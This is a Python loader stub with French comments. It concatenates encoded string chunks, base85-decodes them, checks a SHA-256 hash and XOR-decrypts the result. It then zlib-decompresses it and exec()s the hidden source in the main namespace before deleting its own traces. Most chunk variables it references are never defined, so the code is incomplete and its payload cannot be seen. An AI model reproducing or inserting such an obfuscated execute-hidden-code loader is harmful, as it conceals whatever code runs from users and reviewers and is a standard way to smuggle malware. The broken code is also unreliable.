_cfVjRZoVXdpHrV = '9D0<6eoMy>+a2y^=ls_;WL{5wM*#Qlp12<M)Z)0DC}zwy4aR4|EILQ}TIIjk'
_chvZI4ZEEga3Bu = 'vsLGa>I<iUI|iAOneAZN^;h^2>%mS=yK@<EjzLaHs6{i?On#p!>3kGH(umnu'
_cjHw9gIYKHoBDL = '_b~6G2l((}ll@U>Ji$+UMVy*x!=7I`Dj!PQ2s%3Llpb`m8$C|EY%c*42-c2d'
_cwrJz5gKG4TXIO = 'Gw})y?vy!S)I*Dj;q7Q$x?!Rn@-ok*Gcr<|eE!eE4At$kXE~K#q~{(WPXW=>'
_chEu9sqitwKVQO = 'tx3^8qBQ?0j@bHxwJWE!$9wQqE3mg=cs$YyT1zkNElOR`fMw2vK`re^pM4Mn'
_ceNY50Fo_OMBOR = 'h$UWO-vFC4%1=UlE<)<%_J%SrY3c21XG4!tm=ShqujFXUJ^'

_pnQxNfutzIue7K = __import__('base64').b85decode(_cwQa28w1qPZbVr + _crN6qvhW7ydPV0 + _cyX7_3EQKeE3Ij + _cgOBDJtUqggNk2 + _chBEoFVROHvkdY + _csoIckSmWP7Fsu + _cv6dSnoOR1jAdI + _cbWxXaOshbW5zG + _cqnPE4EeD68bLj + _caHcWKmoIqthRq + _ct2Ok8QGhBnmjB + _ceScTna5IVvQdc + _cbVNERhKXZXAB1 + _cdo1qp9w_ifisQ + _cnhxj9mQLnCDrs + _cnmmTe6lF_eP02 + _cnjv7ZAcr17oPJ + _c_u6_EvOCmvMgH + _cfHibyigt5zGxx + _cpIPIempzttyTV + _cqVpIkfpCKDCe3 + _cqZH4uDp0A7Nzd + _cl78mL1d6V9cis + _ctxmbsgs6JjK0b + _cdLdSyolyy8UUG + _c_pAHwJrEh035C + _ca99RGE3rsgN6i + _ctlUJqEBra0zBx + _czGtBRNBsi0rn4 + _coC3gY9Gcbf7rf + _chKOCQQrn8R4XV + _cbe6G4zGjtfp9o + _cmrc1KwtYZVQph + _ci01TuHszZiDCm + _cshRUO38tIDtoa + _cleVQDqycdpew5 + _csfObFp6bORe01 + _ci0nv0L0fPUsCr + _cij60AsfeTfelp + _cuVN4KuBJvwCjU + _cqeF_CwmfuBW6o + _caAfMDzHtJomNJ + _ci5gnbC5VFbZQV + _cwC7ox3qz2jFaU + _cnXtBgdapPJllk + _cfOj44mHjZyUHi + _cwrKe4uggBrjX8 + _ctDeJ4n2ECG9EC + _cwPPN91P0RWJUX + _ctUzdtY617wyzd + _cbvbkrRisFFcMa + _chqyBVZEHgAez1 + _cbsdJH1_OVINPn + _cxWIvWzCaCGyTa + _cyeeUPgfNDByzB + _cvB31b2t8pgByQ + _cvVD5Dmhc4FNQe + _ctYxKDdnSXhla2 + _czUVWd28f8DDq3 + _ck0en4UK_WHApV + _cgU1dyGs7klOG_ + _cf3MUdIUbF1E1T + _clVoM1DmrUD0I3 + _ceTz9hC85s8lsv + _cbzlHIYNCpk1g3 + _cmCMgS3CSZnwOO + _cbnPjnwlK7elOP + _ceUy1i7Sisuq5p + _cdlMrL7GiM7OhJ + _ciXHRCAwXCKtIc + _cutfyslIYiruOu + _c_4InHa7kCDVOl + _cjPNksyoCFpd6E + _ch8Cq69pk8ij_K + _cz6aGOs2avtwjQ + _ceInfDam1He928 + _cr3ef6UYOq8Qjn + _cctIeNwqHb6aix + _csxJN8IqJEV7u3 + _ccPKg4NBQ9TMQA + _cmx_bTgGo3s0Rr + _clJRvOq6EfrCJj + _ccxAiFukW4HZgQ + _cnqi30Te7zJcJZ + _cjS1NbBigN_fzX + _cqm4M4sp7zOU5h + _c_n9yNquzHj2Wm + _cueQPFkbQWYeOs + _clFVGbSB8Dm2bH + _cpNBgNCVxNaSON + _cuuFNjLTW16jrP + _cvy6FvOBDPqx66 + _ceBaCmKTcjCXet + _cbdgx0SKEZwSxd + _ciKo14PUp9ed__ + _ct_sxIMfcy3zF5 + _cpZ0TUjwZR1iCQ + _ccsSkBcJUjcU6m + _cgm4dQ_25MOlEk + _cfl3e82j3JY5Wp + _ccShtrRUJ2TqUG + _cjMSi0eXLVjgnS + _cz_HjUKqAGxiHV + _ciqZ9_iOuQk65k + _cpyvTsW_lvamBN + _cuO9OPOQWYdpiA + _cv6r24NU3Yhxb1 + _coLh4Xo_4hculb + _ceV3OCqNp3rKhY + _caWVRdyH2LWmxu + _ciewVvsQ3tjtuB + _cayhSx9ufGv8yb + _cgvDXzZR9cUrFa + _cg7am4nm1sum3B + _c_a4NXv0YURiqz + _ce3Cem8daBTdU8 + _cb0yeOHFIPOvsV + _cwxY0FPOkgxt4v + _clSzCdqi6xWzxU + _cc7JvylqUJaX2t + _ck9TGvp347rnsr + _cpw6B7WgzLC34J + _cyBLN_QYCPoU65 + _cp_AOvTN9dBXNX + _ci7oYr11566qvt + _caHU79pTPsYRGE + _ca1EG6VokRPhRp + _cc5D10X9TTzIbm + _cym4kNSmbco60h + _ceGdQFWXBsmygR + _cvV9_EIGkEaO6T + _ct57uRRo7u7BZM + _ccZcX7ilKhrSZj + _cdZQseQAGcEp_f + _cxbXuT_YSZKp3a + _cnJjkQY6sa5_j5 + _cczsVfkLasmH5e + _cq3wsM_KMeoWSz + _cvOjKgVCnrq0HC + _ctxGdEtHbCMvcb + _cqJxjoE1XE8iBk + _cmgyTmU95tBXqd + _ccQER9P8u1vUp9 + _cvtOPGDQWtnfqU + _ckjONyqhcdGkX1 + _chBWdRfeGjuC1i + _ctHq9b5L504SNO + _cqAM4O2MpkMXyC + _cczRVCp0toc73L + _cqRqnbTifRZIuR + _ciAkdgnT0hqtJj + _ce1V7zIHTcTEjI + _ci6C_LbnfPRd7e + _cbEbiwg_0KbDSj + _chI_GCNUZz8d0B + _ccCZDQNyqKcWlR + _ciyPKXz81bAPv0 + _cecZ3rk0ErCGey + _cdaAQzHg_Egu_I + _codvYYewwvyZux + _cejYXA2jOBCAc3 + _cpPidHJFeXnVbu + _cerJQedBA2t0yl + _ceYSxC2eyA8TGa + _cg6Vmz3QkOVYIU + _cwugKqK0OiMDXJ + _cbcR4Nn2pxfZci + _cckufv6BkvGuYp + _cvyTtfDb6QHTIi + _ciPdRaabyXs_XA + _cgZBoQUSs4pgAG + _c_p9ARtAWXcYV3 + _cuhCnskKA5olJf + _cnP7RunE9uPFmD + _cnN6ZaoM5VVenR + _cneBfBC9ZilJxu + _csUgZZAV7dYxId + _cj1G85Ukhy_ZW6 + _cy6HVtqL_XU99Z + _cpKwBB0pQWvHIw + _cqVcqgisBs0_nU + _cj0SB71y1FXFPU + _cfVjRZoVXdpHrV + _chvZI4ZEEga3Bu + _cjHw9gIYKHoBDL + _cwrJz5gKG4TXIO + _chEu9sqitwKVQO + _ceNY50Fo_OMBOR)
if __import__('hashlib').sha256(_pnQxNfutzIue7K).hexdigest() != '690187a6339fa4b0f3d83771b2113ab37d64e373193636a2dfbe8f60e8fbf6ef':
    __import__('sys').exit(1)
_xwsq2KJVQtegx_ = bytes([208, 177, 27, 26, 71, 150, 176, 127, 170, 247, 21, 177, 240, 195])
_fkth1RzLwS200F9 = bytes([84, 29, 109, 243, 130, 108, 217, 244, 54, 160, 31, 159, 249, 40])

def _fxo3VUI2s1BbJ8U(_by3qPsRCnIpPoH, _kslDnwu0oKyZBT):
    return bytes(_by3qPsRCnIpPoH[_i_0KUqeWGeFp6z] ^ _kslDnwu0oKyZBT[_i_0KUqeWGeFp6z % len(_kslDnwu0oKyZBT)] for _i_0KUqeWGeFp6z in range(len(_by3qPsRCnIpPoH)))

def _fdzaQZiEGlWNTs3(_tv8zNOX5Pq81v_):
    import zlib
    return zlib.decompress(_tv8zNOX5Pq81v_) # Un seul niveau de zlib ici pour simplifier

def _fegZnY_hReRdyGE():
    import sys, builtins
    # 1. Déchiffrement XOR
    _x_zSQd1VZdwuje = _fxo3VUI2s1BbJ8U(_pnQxNfutzIue7K, _xwsq2KJVQtegx_)
    # 2. Décompression Zlib
    _dyPkXf9U4V1umg = _fdzaQZiEGlWNTs3(_x_zSQd1VZdwuje)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dyPkXf9U4V1umg.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _niCyeAlwzU02Bn = _main.__dict__
    _niCyeAlwzU02Bn.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _niCyeAlwzU02Bn)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fegZnY_hReRdyGE()
try:
    del _fxo3VUI2s1BbJ8U, _fdzaQZiEGlWNTs3, _fegZnY_hReRdyGE
    del _pnQxNfutzIue7K, _xwsq2KJVQtegx_, _fkth1RzLwS200F9
except:
    pass
